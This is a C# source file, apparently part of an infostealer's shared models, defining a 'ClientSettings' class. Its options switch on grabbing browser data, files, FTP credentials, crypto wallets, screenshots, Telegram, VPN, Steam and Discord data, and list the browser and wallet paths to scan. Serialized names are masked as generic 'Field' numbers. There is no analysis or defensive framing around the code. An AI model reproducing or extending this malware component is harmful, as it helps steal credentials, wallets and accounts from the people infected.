using System.Collections.Generic;
using System.Runtime.Serialization;

namespace Meta.SharedModels;

[DataContract(Name = "FieldRoot18", Namespace = "exampleNs")]
public class ClientSettings
{
    [DataMember(Name = "Field1")]
    public bool GrabBrowsers { get; set; }

    [DataMember(Name = "Field2")]
    public bool GrabFiles { get; set; }

    [DataMember(Name = "Field3")]
    public bool GrabFTP { get; set; }

    [DataMember(Name = "Field4")]
    public bool GrabWallets { get; set; }

    [DataMember(Name = "Field5")]
    public bool GrabScreenshot { get; set; }

    [DataMember(Name = "Field6")]
    public bool GrabTelegram { get; set; }

    [DataMember(Name = "Field7")]
    public bool GrabVPN { get; set; }

    [DataMember(Name = "Field8")]
    public bool GrabSteam { get; set; }

    [DataMember(Name = "Field9")]
    public bool GrabDiscord { get; set; }

    [DataMember(Name = "Field10")]
    public List<string> GrabPaths { get; set; }

    [DataMember(Name = "Field11")]
    public List<string> ScanChromeBrowsersPaths { get; set; }

    [DataMember(Name = "Field12")]
    public List<string> ScanGeckoBrowsersPaths { get; set; }

    [DataMember(Name = "Field13")]
    public List<WalletConfig> Configs { get; set; }

    [DataMember(Name = "Field14")]
    public string ExtensionPaths { get; set; }

    [DataMember(Name = "Field15")]
    public List<string> SystemVarsNames { get; set; }
}
